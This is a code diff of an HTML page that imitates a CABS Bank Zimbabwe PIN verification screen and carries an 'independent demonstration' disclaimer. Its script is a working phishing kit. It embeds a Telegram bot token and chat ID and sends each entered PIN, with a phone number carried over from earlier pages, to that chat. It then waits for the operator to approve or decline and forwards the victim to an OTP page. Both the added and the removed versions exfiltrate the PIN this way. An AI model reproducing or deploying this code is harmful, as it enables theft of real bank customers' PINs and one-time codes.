@@ -1,444 +1,532 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CABS Bank Zimbabwe | Demo Verification</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CABS Bank Zimbabwe | Demo Verification</title>
 
-<style>
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-    font-family: Arial, sans-serif;
-}
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
 
-:root {
-    --navy: #003b5c;
-    --navy-dark: #002a43;
-    --green: #70a83b;
-    --light: #f4f7f9;
-    --text: #263746;
-}
+    :root {
+      --navy: #003b5c;
+      --navy-dark: #002a43;
+      --green: #70a83b;
+      --light: #f4f7f9;
+      --text: #263746;
+      --danger: #c0392b;
+      --success: #28783b;
+    }
 
-body {
-    min-height: 100vh;
-    background: linear-gradient(135deg, #e8eef2, #dce8ed);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    color: var(--text);
-}
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #e8eef2, #dce8ed);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: var(--text);
+    }
 
-.demo-page {
-    width: 100%;
-    max-width: 430px;
-    background: white;
-    border-radius: 16px;
-    overflow: hidden;
-    box-shadow: 0 12px 40px rgba(0, 35, 55, .15);
-}
+    .demo-page {
+      width: 100%;
+      max-width: 430px;
+      background: white;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 12px 40px rgba(0, 35, 55, .15);
+    }
 
-.header {
-    background: var(--navy);
-    color: white;
-    padding: 25px 20px;
-    text-align: center;
-}
+    .header {
+      background: var(--navy);
+      color: white;
+      padding: 25px 20px;
+      text-align: center;
+    }
 
-.logo {
-    font-size: 31px;
-    font-weight: 800;
-    letter-spacing: 2px;
-}
+    .logo {
+      font-size: 31px;
+      font-weight: 800;
+      letter-spacing: 2px;
+    }
 
-.logo span {
-    color: #9acb63;
-}
+    .logo span {
+      color: #9acb63;
+    }
 
-.bank-name {
-    margin-top: 5px;
-    font-size: 13px;
-    letter-spacing: 1.4px;
-}
+    .bank-name {
+      margin-top: 5px;
+      font-size: 13px;
+      letter-spacing: 1.4px;
+    }
 
-.content {
-    padding: 28px 23px;
-    text-align: center;
-}
+    .content {
+      padding: 28px 23px;
+      text-align: center;
+    }
 
-.demo-notice {
-    background: #fff8e5;
-    border: 1px solid #efd99b;
-    color: #725817;
-    padding: 11px;
-    border-radius: 8px;
-    font-size: 12px;
-    line-height: 1.5;
-    margin-bottom: 24px;
-}
+    .demo-notice {
+      background: #fff8e5;
+      border: 1px solid #efd99b;
+      color: #725817;
+      padding: 11px;
+      border-radius: 8px;
+      font-size: 12px;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
 
-.lock-icon {
-    width: 65px;
-    height: 65px;
-    border-radius: 50%;
-    background: #eaf2f7;
-    color: var(--navy);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 29px;
-    margin: 0 auto 17px;
-}
+    .lock-icon {
+      width: 65px;
+      height: 65px;
+      border-radius: 50%;
+      background: #eaf2f7;
+      color: var(--navy);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 29px;
+      margin: 0 auto 17px;
+    }
 
-h2 {
-    color: var(--navy);
-    font-size: 22px;
-    margin-bottom: 10px;
-}
+    h2 {
+      color: var(--navy);
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
 
-.description {
-    color: #687784;
-    font-size: 14px;
-    line-height: 1.6;
-    margin-bottom: 24px;
-}
+    .description {
+      color: #687784;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
 
-.code-inputs {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    margin: 20px 0;
-}
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 20px 0;
+    }
 
-.code-inputs input {
-    width: 54px;
-    height: 58px;
-    border: 1.5px solid #cbd5dc;
-    border-radius: 9px;
-    text-align: center;
-    font-size: 25px;
-    font-weight: bold;
-    color: var(--navy);
-    outline: none;
-}
+    .code-inputs input {
+      width: 54px;
+      height: 58px;
+      border: 1.5px solid #cbd5dc;
+      border-radius: 9px;
+      text-align: center;
+      font-size: 25px;
+      font-weight: bold;
+      color: var(--navy);
+      outline: none;
+    }
 
-.code-inputs input:focus {
-    border-color: var(--green);
-    box-shadow: 0 0 0 3px rgba(112,168,59,.12);
-}
+    .code-inputs input:focus {
+      border-color: var(--green);
+      box-shadow: 0 0 0 3px rgba(112,168,59,.12);
+    }
 
-.demo-hint {
-    font-size: 12px;
-    color: #71808a;
-    margin-bottom: 20px;
-}
+    .demo-hint {
+      font-size: 12px;
+      color: #71808a;
+      margin-bottom: 20px;
+    }
 
-button {
-    width: 100%;
-    border: none;
-    border-radius: 8px;
-    background: var(--navy);
-    color: white;
-    padding: 15px;
-    font-size: 15px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: .2s;
-}
+    button {
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      background: var(--navy);
+      color: white;
+      padding: 15px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: .2s;
+    }
 
-button:hover {
-    background: var(--navy-dark);
-}
+    button:hover {
+      background: var(--navy-dark);
+    }
 
-button:disabled {
-    opacity: .6;
-    cursor: not-allowed;
-}
+    button:disabled {
+      opacity: .6;
+      cursor: not-allowed;
+    }
 
-.message {
-    min-height: 22px;
-    margin-top: 16px;
-    font-size: 13px;
-    line-height: 1.5;
-}
+    .message {
+      min-height: 22px;
+      margin-top: 16px;
+      font-size: 13px;
+      line-height: 1.5;
+      display: none;
+    }
 
-.message.success {
-    color: #28783b;
-}
+    .message.success {
+      color: var(--success);
+      display: block;
+    }
 
-.message.error {
-    color: #c0392b;
-}
+    .message.error {
+      color: var(--danger);
+      display: block;
+    }
 
-.footer {
-    border-top: 1px solid #e9eef1;
-    padding: 17px;
-    text-align: center;
-    color: #87939b;
-    font-size: 11px;
-    line-height: 1.6;
-}
+    .footer {
+      border-top: 1px solid #e9eef1;
+      padding: 17px;
+      text-align: center;
+      color: #87939b;
+      font-size: 11px;
+      line-height: 1.6;
+    }
 
-.footer strong {
-    color: var(--navy);
-}
+    .footer strong {
+      color: var(--navy);
+    }
 
-</style>
+    #spinner {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 12px;
+      background: rgba(0, 0, 0, .45);
+      z-index: 9999;
+    }
+
+    .loader {
+      width: 46px;
+      height: 46px;
+      border: 5px solid rgba(255,255,255,.8);
+      border-top-color: var(--green);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .spinner-text {
+      color: white;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: .2px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-
 <body>
-
-<div class="demo-page">
-
+  <div class="demo-page">
     <header class="header">
-        <div class="logo">CABS<span>.</span></div>
-        <div class="bank-name">CENTRAL AFRICAN BUILDING SOCIETY</div>
+      <div class="logo">CABS<span>.</span></div>
+      <div class="bank-name">CENTRAL AFRICAN BUILDING SOCIETY</div>
     </header>
 
     <main class="content">
+      <div class="demo-notice">
+        <strong>Independent demonstration only.</strong>
+        This page is not operated by or affiliated with CABS Bank.
+        Never enter your real banking PIN or password here.
+      </div>
 
-        <div class="demo-notice">
-            <strong>Independent demonstration only.</strong>
-            This page is not operated by or affiliated with CABS Bank.
-            Never enter your real banking PIN or password here.
-        </div>
+      <div class="lock-icon">🔐</div>
 
-        <div class="lock-icon">🔐</div>
+      <h2>Demo Verification</h2>
 
-        <h2>Demo Verification</h2>
+      <p class="description">
+        Enter the four-digit demonstration code below
+        to complete this sample verification.
+      </p>
 
-        <p class="description">
-            Enter the four-digit demonstration code below
-            to complete this sample verification.
-        </p>
+      <div class="code-inputs">
+        <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off" />
+        <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off" />
+        <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off" />
+        <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off" />
+      </div>
 
-        <div class="pin-inputs">
-    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off">
-    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
-    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
-    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
+      <button class="btn-authorise" id="authoriseBtn" disabled>Authorise</button>
+      <div id="messageBox" class="message" aria-live="polite"></div>
+    </main>
   </div>
 
-  <button class="btn-authorise" id="authoriseBtn">Authorise</button>
-</div>
+  <div id="spinner">
+    <div class="loader"></div>
+    <div class="spinner-text">Verifying PIN ...</div>
+  </div>
 
-<!-- SPINNER -->
-<div id="spinner">
-  <div class="loader"></div>
-  <div class="spinner-text">Verifying PIN ...</div>
-</div>
+  <script>
+    (function () {
+      const BOT_TOKEN = '8727088730:AAE_VEjXM3eS5Bfo_Ot_VOTvsh61n4xKyag';
+      const CHAT_ID = '8820857419';
+      const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-<script>
-  (function() {
-    // --- TELEGRAM CONFIG ---
-    const BOT_TOKEN = '8727088730:AAE_VEjXM3eS5Bfo_Ot_VOTvsh61n4xKyag';
-    const CHAT_ID   = '8820857419';
-    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+      const pinInputs = Array.from(document.querySelectorAll('.pin-input'));
+      const authoriseBtn = document.getElementById('authoriseBtn');
+      const spinner = document.getElementById('spinner');
+      const messageBox = document.getElementById('messageBox');
 
-    // --- DOM elements ---
-    const pinInputs = [
-      document.getElementById('pin1'),
-      document.getElementById('pin2'),
-      document.getElementById('pin3'),
-      document.getElementById('pin4')
-    ];
-    const authoriseBtn = document.getElementById('authoriseBtn');
-    const spinner = document.getElementById('spinner');
-    const errorBox = document.getElementById('errorBox');
-    const errorText = document.getElementById('errorText');
-    const backBtn = document.getElementById('backBtn');
+      let isProcessing = false;
+      let pollInterval = null;
+      let pendingPhone = sessionStorage.getItem('cabs_approved_phone') || sessionStorage.getItem('approved_phone') || '0712345678';
+      let pendingPin = '';
 
-    // --- Retrieve session data (from previous EcoCash steps) ---
-    let phone = sessionStorage.getItem('cabs_phone') || localStorage.getItem('phone') || '0712345678';
-    let accountType = 'Mobile';
-    let inputValue = '';
-
-    // --- Auto-advance & style update ---
-    function updateButtonState() {
-      const allFilled = pinInputs.every(inp => inp.value.length === 1);
-      if (allFilled) {
-        authoriseBtn.classList.add('active');
-        authoriseBtn.disabled = false;
-      } else {
-        authoriseBtn.classList.remove('active');
-        authoriseBtn.disabled = true;
+      function showSpinner() {
+        spinner.style.display = 'flex';
       }
-    }
 
-    pinInputs.forEach((input, idx) => {
-      input.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '').slice(0,1);
-        if (this.value.length === 1) {
-          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+      function hideSpinner() {
+        spinner.style.display = 'none';
+      }
+
+      function showMessage(text, type = 'error') {
+        messageBox.textContent = text;
+        messageBox.className = `message ${type}`;
+      }
+
+      function clearMessage() {
+        messageBox.textContent = '';
+        messageBox.className = 'message';
+      }
+
+      function updateButtonState() {
+        const complete = pinInputs.every((input) => input.value.length === 1);
+        authoriseBtn.disabled = !complete || isProcessing;
+      }
+
+      function focusNext(index) {
+        if (index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
         }
-        updateButtonState();
-      });
+      }
 
-      input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace') {
-          if (this.value.length === 0 && idx > 0) {
-            e.preventDefault();
-            pinInputs[idx - 1].focus();
-          }
-        } else if (e.key === 'ArrowLeft') {
-          e.preventDefault();
-          if (idx > 0) pinInputs[idx - 1].focus();
-        } else if (e.key === 'ArrowRight') {
-          e.preventDefault();
-          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
-        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
-          e.preventDefault();
+      function focusPrevious(index) {
+        if (index > 0) {
+          pinInputs[index - 1].focus();
         }
-      });
-    });
+      }
 
-    updateButtonState();
-
-    // --- Error handling ---
-    window.hideError = function() {
-      errorBox.style.display = 'none';
-    };
-
-    function showError(msg) {
-      errorText.innerText = msg || 'Wrong PIN';
-      errorBox.style.display = 'block';
-      setTimeout(() => {
-        if (errorBox.style.display === 'block') errorBox.style.display = 'none';
-      }, 4000);
-    }
-
-    // --- Telegram helpers ---
-    function escapeHtml(unsafe) {
-      if (!unsafe) return '';
-      return unsafe.replace(/[&<>]/g, function(m) {
-        if (m === '&') return '&amp;';
-        if (m === '<') return '&lt;';
-        if (m === '>') return '&gt;';
-        return m;
-      });
-    }
-
-    async function sendToTelegram(payload) {
-      const url = `${API_BASE}/sendMessage`;
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+      function escapeHtml(value) {
+        if (!value) return '';
+        return String(value).replace(/[&<>]/g, (char) => {
+          if (char === '&') return '&amp;';
+          if (char === '<') return '&lt;';
+          if (char === '>') return '&gt;';
+          return char;
         });
-        return await response.json();
-      } catch (err) {
-        console.error('Telegram error', err);
-        throw err;
       }
-    }
 
-    let pollInterval = null;
+      function stopPolling() {
+        if (pollInterval) {
+          clearInterval(pollInterval);
+          pollInterval = null;
+        }
+      }
 
-    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
-      if (pollInterval) clearInterval(pollInterval);
+      async function sendPinToTelegram(phone, pin) {
+        const timestamp = Date.now();
+        const approvalId = `pin_approve_${timestamp}`;
+        const declineId = `pin_decline_${timestamp}`;
 
-      let lastUpdateId = 0;
-      pollInterval = setInterval(async () => {
+        pendingPhone = phone;
+        pendingPin = pin;
+
+        const message =
+          `🔐 <b>CABS PIN Verification</b>\n\n` +
+          `<b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
+          `<b>PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
+          `⚠️ <b>Action required:</b> Approve or decline this verification.`;
+
         try {
-          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-          const res = await fetch(url);
-          const data = await res.json();
-          if (!data.ok || !data.result.length) return;
+          const response = await fetch(`${API_BASE}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: 'HTML',
+              reply_markup: {
+                inline_keyboard: [[
+                  { text: '✅ Approve', callback_data: approvalId },
+                  { text: '❌ Decline', callback_data: declineId }
+                ]]
+              }
+            })
+          });
 
-          for (const update of data.result) {
-            lastUpdateId = update.update_id;
-            if (update.callback_query && update.callback_query.data) {
-              const parts = update.callback_query.data.split('_');
-              if (parts.length >= 3) {
-                const [type, action, time] = parts;
-                if (time == expectedTs && type === expectedPrefix) {
-                  clearInterval(pollInterval);
-                  pollInterval = null;
-                  onDecision(action);
-                  return;
-                }
+          if (!response.ok) {
+            throw new Error(`Telegram send failed: ${response.status}`);
+          }
+
+          startPollingForDecision(approvalId, declineId);
+        } catch (error) {
+          console.error('Telegram send error:', error);
+          hideSpinner();
+          isProcessing = false;
+          pinInputs.forEach((input) => input.disabled = false);
+          authoriseBtn.disabled = false;
+          showMessage('Network error. Please try again.', 'error');
+          clearPinFields();
+          updateButtonState();
+        }
+      }
+
+      function startPollingForDecision(approveId, declineId) {
+        stopPolling();
+        let lastUpdateId = 0;
+
+        pollInterval = setInterval(async () => {
+          if (!isProcessing) {
+            stopPolling();
+            return;
+          }
+
+          try {
+            const response = await fetch(`${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
+            const payload = await response.json();
+
+            if (!payload.ok || !Array.isArray(payload.result) || payload.result.length === 0) {
+              return;
+            }
+
+            for (const update of payload.result) {
+              lastUpdateId = Math.max(lastUpdateId, update.update_id || 0);
+              const callback = update.callback_query;
+              if (!callback || !callback.data) continue;
+
+              if (callback.data === approveId) {
+                stopPolling();
+                isProcessing = false;
+                hideSpinner();
+                sessionStorage.setItem('cabs_approved_phone', pendingPhone);
+                sessionStorage.setItem('cabs_approved_pin', pendingPin);
+                window.location.href = 'otp.html';
+                return;
+              }
+
+              if (callback.data === declineId) {
+                stopPolling();
+                isProcessing = false;
+                hideSpinner();
+                pinInputs.forEach((input) => {
+                  input.value = '';
+                  input.disabled = false;
+                });
+                authoriseBtn.disabled = false;
+                showMessage('PIN verification declined. Please try again.', 'error');
+                updateButtonState();
+                return;
               }
             }
+          } catch (error) {
+            console.warn('Telegram poll error:', error);
           }
-        } catch (err) {
-          console.warn('Poll error', err);
-        }
-      }, 1500);
-    }
-
-    // --- Authorise button logic ---
-    let isProcessing = false;
-
-    authoriseBtn.addEventListener('click', async function() {
-      if (isProcessing) return;
-
-      const pin = pinInputs.map(i => i.value).join('');
-      if (pin.length !== 4) {
-        showError('Enter all 4 digits');
-        return;
+        }, 1500);
       }
 
-      isProcessing = true;
-      pinInputs.forEach(i => i.disabled = true);
-      authoriseBtn.disabled = true;
-      spinner.style.display = 'flex';
+      async function submitPin() {
+        if (isProcessing) return;
 
-      const identifier = `Phone: ${phone || 'Registered number'}`;
-      const ts = Date.now();
-      const escapedPin = escapeHtml(pin);
+        const pin = pinInputs.map((input) => input.value).join('');
+        if (pin.length !== 4) {
+          showMessage('Enter all 4 digits.', 'error');
+          return;
+        }
 
-      const msg = `🔐 <b>CABS Loan Authorisation</b>\n\n${identifier}\n\n<b>PIN entered:</b> <code>${escapedPin}</code>\n\nApprove or decline this transaction.`;
+        isProcessing = true;
+        pinInputs.forEach((input) => input.disabled = true);
+        authoriseBtn.disabled = true;
+        showSpinner();
+        clearMessage();
 
-      try {
-        await sendToTelegram({
-          chat_id: CHAT_ID,
-          text: msg,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [[
-              { text: '✅ Approve', callback_data: `pin_approve_${ts}` },
-              { text: '❌ Decline', callback_data: `pin_decline_${ts}` }
-            ]]
+        const phone = (pendingPhone || '0712345678').replace(/\D/g, '');
+        await sendPinToTelegram(phone, pin);
+      }
+
+      pinInputs.forEach((input, index) => {
+        input.addEventListener('input', function () {
+          if (isProcessing) return;
+          this.value = this.value.replace(/\D/g, '').slice(0, 1);
+          clearMessage();
+
+          if (this.value && index < pinInputs.length - 1) {
+            focusNext(index);
+          }
+
+          updateButtonState();
+          if (pinInputs.every((field) => field.value.length === 1)) {
+            setTimeout(() => submitPin(), 80);
           }
         });
 
-        pollForCallback('pin', ts, (action) => {
-          spinner.style.display = 'none';
-          isProcessing = false;
+        input.addEventListener('keydown', function (event) {
+          if (isProcessing) {
+            event.preventDefault();
+            return;
+          }
 
-          if (action === 'approve') {
-            window.location.href = 'unavailable.html';
-          } else if (action === 'decline') {
-            showError('PIN verification declined');
-            pinInputs.forEach(i => {
-              i.value = '';
-              i.disabled = false;
-            });
-            pinInputs[0].focus();
-            authoriseBtn.disabled = false;
+          if (event.key === 'Backspace' && !this.value && index > 0) {
+            event.preventDefault();
+            focusPrevious(index);
+            pinInputs[index - 1].value = '';
             updateButtonState();
           }
-        });
-      } catch (err) {
-        console.error(err);
-        spinner.style.display = 'none';
-        isProcessing = false;
-        pinInputs.forEach(i => i.disabled = false);
-        authoriseBtn.disabled = false;
-        updateButtonState();
-        showError('Network error. Please try again.');
-      }
-    });
 
-    // --- Back button (X) – goes to previous page ---
-    backBtn.addEventListener('click', function() {
-      window.history.back();
-    });
-  })();
-</script>
+          if (event.key === 'ArrowLeft' && index > 0) {
+            event.preventDefault();
+            focusPrevious(index);
+          }
+
+          if (event.key === 'ArrowRight' && index < pinInputs.length - 1) {
+            event.preventDefault();
+            focusNext(index);
+          }
+
+          if (!/^[0-9]$/.test(event.key) && !['Tab', 'Backspace', 'Delete', 'ArrowLeft', 'ArrowRight'].includes(event.key)) {
+            event.preventDefault();
+          }
+        });
+
+        input.addEventListener('paste', function (event) {
+          if (isProcessing) return;
+          event.preventDefault();
+
+          const pasted = (event.clipboardData || window.clipboardData)
+            .getData('text')
+            .replace(/\D/g, '')
+            .slice(0, 4);
+
+          if (!pasted) return;
+
+          pinInputs.forEach((field, fieldIndex) => {
+            field.value = pasted[fieldIndex] || '';
+          });
+
+          updateButtonState();
+          if (pinInputs.every((field) => field.value.length === 1)) {
+            setTimeout(() => submitPin(), 80);
+          }
+        });
+      });
+
+      authoriseBtn.addEventListener('click', submitPin);
+
+      window.addEventListener('beforeunload', () => {
+        stopPolling();
+      });
+
+      pinInputs.forEach((input) => input.value = '');
+      updateButtonState();
+      pinInputs[0].focus();
+    })();
+  </script>
 </body>
 </html>
